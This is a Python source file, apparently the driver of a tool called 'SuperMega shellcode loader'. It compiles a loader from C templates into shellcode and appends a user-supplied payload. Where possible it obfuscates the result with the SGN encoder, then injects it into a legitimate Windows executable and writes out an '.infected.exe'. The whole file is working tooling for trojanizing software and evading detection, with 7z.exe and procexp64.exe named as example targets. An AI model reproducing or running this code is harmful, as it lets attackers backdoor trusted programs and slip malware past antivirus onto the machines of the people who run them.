import shutil
from enum import Enum
import argparse
from typing import Dict
import os
import logging
import time

from defs import *
from model import *
from helper import *
from config import config
import phases.templater
import phases.compiler
import phases.assembler
import phases.injector
from observer import observer
from project import project


# ANSI escape sequences for colors
class LogColors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Custom formatter to include colors in log output
class CustomFormatter(logging.Formatter):
    #format = "%(asctime)s - %(name)-12s - [%(levelname)-8s] - %(message)s (%(filename)s:%(lineno)d)"
    format = "(%(filename)-12s) %(message)s"

    FORMATS = {
        logging.DEBUG: format,
        logging.INFO: format,
        logging.WARNING: LogColors.WARNING + format + LogColors.ENDC,
        logging.ERROR: LogColors.FAIL + format + LogColors.ENDC,
        logging.CRITICAL: LogColors.FAIL + LogColors.BOLD + format + LogColors.ENDC
    }

    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt, datefmt="%Y-%m-%d %H:%M:%S")
        return formatter.format(record)

# Configure logging
handler = logging.StreamHandler()
handler.setFormatter(CustomFormatter())
logging.basicConfig(level=logging.DEBUG, handlers=[handler])
logger = logging.getLogger("ExploitLogger")


def main():
    logger.info("Super Mega")
    config.load()

    parser = argparse.ArgumentParser(description='SuperMega shellcode loader')
    parser.add_argument('--shellcode', type=str, help='The path to the file of your payload shellcode')
    parser.add_argument('--inject', type=str, help='The path to the file where we will inject ourselves in')
    parser.add_argument('--start-injected', action='store_true', help='Dev: Start the generated infected executable at the end')
    parser.add_argument('--start-loader-shellcode', action='store_true', help='Dev: Start the loader shellcode (without payload)')
    parser.add_argument('--start-final-shellcode', action='store_true', help='Debug: Start the final shellcode (loader + payload)')
    parser.add_argument('--no-clean-at-start', action='store_true', help='Debug: Dont remove any temporary files at start')
    parser.add_argument('--no-clean-at-exit', action='store_true', help='Debug: Dont remove any temporary files at exit')
    parser.add_argument('--verify', type=str, help='Debug: Perform verification: std/iat')
    parser.add_argument('--show', action='store_true', help='Debug: Show tool output')
    args = parser.parse_args()

    if args.show:
        project.show_command_output = True

    if args.verify:
        project.payload = "shellcodes/createfile.bin"
        project.verify = True

        project.try_start_final_infected_exe = False
        project.try_start_final_shellcode = False

        if args.verify == "peb":
            project.source_style = SourceStyle.peb_walk
            project.inject = True
            project.inject_mode = "1,1"
            project.inject_exe_in = "exes/procexp64.exe"
            project.inject_exe_out = "out/procexp64-a.exe"
        elif args.verify == "iat":
            project.source_style = SourceStyle.iat_reuse
            project.inject = True
            project.inject_mode = "1,1"
            project.inject_exe_in = "exes/iattest-full.exe"
            project.inject_exe_out = "out/iatttest-full-a.exe"
        elif args.verify == "rwx":
            project.source_style = SourceStyle.peb_walk
            project.inject = True
            project.inject_mode = "1,1"
            project.inject_exe_in = "exes/wifiinfoview.exe"
            project.inject_exe_out = "out/wifiinfoview.exe-a.exe"

        else:
            logger.info("Unknown verify option {}, use std/iat".format(args.verify))

    else:
        project.try_start_final_infected_exe = args.start_injected
        project.try_start_final_shellcode = args.start_final_shellcode
        project.try_start_loader_shellcode = args.start_loader_shellcode

        project.cleanup_files_on_start = not args.no_clean_at_start
        project.cleanup_files_on_exit =not args.no_clean_at_exit

        if not args.shellcode or not args.inject:
            logger.error("Require: --shellcode <shellcode file> --inject <injectable.exe>")
            logger.info(r"Example: .\supermega.py --shellcode .\shellcodes\calc64.bin --inject .\exes\7z.exe")
            return 1

        if args.shellcode:
            if not os.path.isfile(args.shellcode):
                logger.info("Could not find: {}".format(args.shellcode))
                return
            project.payload = args.shellcode
        if args.inject:
            if not os.path.isfile(args.inject):
                logger.info("Could not find: {}".format(args.inject))
                return
            project.inject = True
            project.inject_exe_in = args.inject
            project.inject_exe_out = args.inject.replace(".exe", ".infected.exe")

    start()


def start():
    # Delete: all old files
    if project.cleanup_files_on_start:
        clean_files()
        delete_all_files_in_directory("logs/")

    # Check: Destination EXE capabilities
    project.exe_capabilities = ExeCapabilities([
        "GetEnvironmentVariableW",
        "VirtualAlloc"
    ])
    project.exe_capabilities.parse_from_exe(project.inject_exe_in)
    project.exe_capabilities.print()

    # choose which source / technique we gonna use
    if project.exe_capabilities.has_all():
        project.source_style = SourceStyle.iat_reuse
    else:
        logger.info("--[ Some imports are missing for the shellcode to use IAT_REUSE")
        project.source_style = SourceStyle.peb_walk

    #observer.add_json("capabilities_a", project.exe_capabilities)
    #observer.add_json("options", options)

    logger.warning("--[ SourceStyle: {}".format(project.source_style.name))

    # Copy: loader C files into working directory: build/
    phases.templater.create_c_from_template(
        source_style = project.source_style,
        alloc_style  = project.alloc_style,
        exec_style   = project.exec_style,
        decoder_style= project.decoder_style,
        build_dir    = project.build_dir,
    )

    # Convert: C -> ASM
    if project.generate_asm_from_c:
        # Find payload size
        with open(project.payload, 'rb') as input2:
            data_payload = input2.read()
            payload_length = len(data_payload)
            #observer.add_text("payload_asm_orig", str(data_payload))
        asm = phases.compiler.make_c_to_asm(main_c_file, main_asm_file, payload_length, project.exe_capabilities)
        observer.add_text("payload_asm_orig", asm["initial"])
        observer.add_text("payload_asm_cleanup", asm["cleanup"])
        observer.add_text("payload_asm_fixup", asm["fixup"])

    # Convert: ASM -> Shellcode
    if project.generate_shc_from_asm:
        code = phases.assembler.asm_to_shellcode(
            asm_in = main_asm_file, 
            build_exe = main_exe_file, 
            shellcode_out = main_shc_file)
        observer.add_code("generate_shc_from_asm", code) 
    
    # Try: Starting the shellcode (rarely useful)
    if project.try_start_loader_shellcode:
        try_start_shellcode(main_shc_file)

    # Merge shellcode/loader with payload
    if project.dataref_style == DataRefStyle.APPEND:
        phases.assembler.merge_loader_payload(
            shellcode_in = main_shc_file,
            shellcode_out = main_shc_file,
            payload = project.payload, 
            decoder_style = project.decoder_style)

        if project.verify and project.source_style == SourceStyle.peb_walk:
            logger.info("--[ Verify final shellcode")
            if not verify_shellcode(main_shc_file):
                logger.info("Could not verify, still continuing")
                #return

        if project.try_start_final_shellcode:
            logger.info("--[ Test Append shellcode")
            try_start_shellcode(main_shc_file)

        # copy it to out
        shutil.copyfile(main_shc_file, os.path.join("out/", os.path.basename(main_shc_file)))

    # SGN
    #  after we packed everything (so jmp to end of code still works)
    #if options["obfuscate_shc_loader"] and project.exe_capabilities.rwx_section != None:
    if project.exe_capabilities.rwx_section != None:
        logger.info("--[ RWX section {} found. Will obfuscate loader+payload and inject into it".format(
            project.exe_capabilities.rwx_section.Name.decode().rstrip('\x00')
        ))
        obfuscate_shc_loader(main_shc_file, main_shc_file + ".sgn")

        observer.add_code("payload_sgn", file_readall_binary(main_shc_file + ".sgn"))
        shutil.move(main_shc_file + ".sgn", main_shc_file)
    
        #if options["verify"]:
        #    if not verify_shellcode("main-clean.bin"):
        #        return

    # inject merged loader into an exe
    if project.inject:
        #debug_data["original_exe"] = file_readall_binary(options["inject_exe_in"])

        phases.injector.inject_exe(main_shc_file)
        if project.verify:
            logger.info("--[ Verify final exe")
            if phases.injector.verify_injected_exe(project.inject_exe_out):
                #debug_data["infected_exe"] = file_readall_binary(options["inject_exe_out"])
                pass

        if project.try_start_final_infected_exe:
            logger.info("--[ Start infected exe")
            run_process_checkret([
                project.inject_exe_out,
            ], check=False)

    # dump the info i gathered
    #file = open('latest.pickle', 'wb')
    #pickle.dump(data, file)
    #file.close()

    # delete files
    if project.cleanup_files_on_exit:
        clean_files()


def obfuscate_shc_loader(file_shc_in, file_shc_out):
    logger.info("--[ Obfuscate shellcode with SGN")
    if True:
        path_sgn = r'C:\tools\sgn2.0\sgn.exe'
        run_process_checkret([
            path_sgn,
            "-a", "64",
            "{}".format(file_shc_in),
        ], check=True)
        #shutil.copy(file_shc_in + ".sgn", file_shc_out)
    else:
        path_sgn = r'C:\training\tools\sgn\sgn.exe'
        run_process_checkret([
            path_sgn,
            "--arch=64",
            "-i", "{}".format(file_shc_in),
            "-o", "{}".format(file_shc_out),
        ], check=True)
    if not os.path.isfile(file_shc_out):
        logger.info("Error")
        return
    else:
        logger.info("   > Success obfuscation")
        pass


def verify_shellcode(shc_name):
    logger.info("---[ Verify shellcode: {}".format(shc_name))

    # check if directory exists
    if not os.path.exists(os.path.dirname(project.verify_filename)):
        logger.info("Error, directory does not exist for: {}".format(project.verify_filename))
        return
    
    # remove indicator file
    pathlib.Path(project.verify_filename).unlink(missing_ok=True)

    run_process_checkret([
        config.get("path_runshc"),
        "{}".format(shc_name),
    ], check=False)
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(project.verify_filename):
        logger.info("---> Verify OK. Shellcode works (file was created)")
        os.remove(project.verify_filename)
        return True
    else:
        logger.info("---> Verify FAIL. Shellcode doesnt work (file was not created)")
        return False
    

if __name__ == "__main__":
    main()
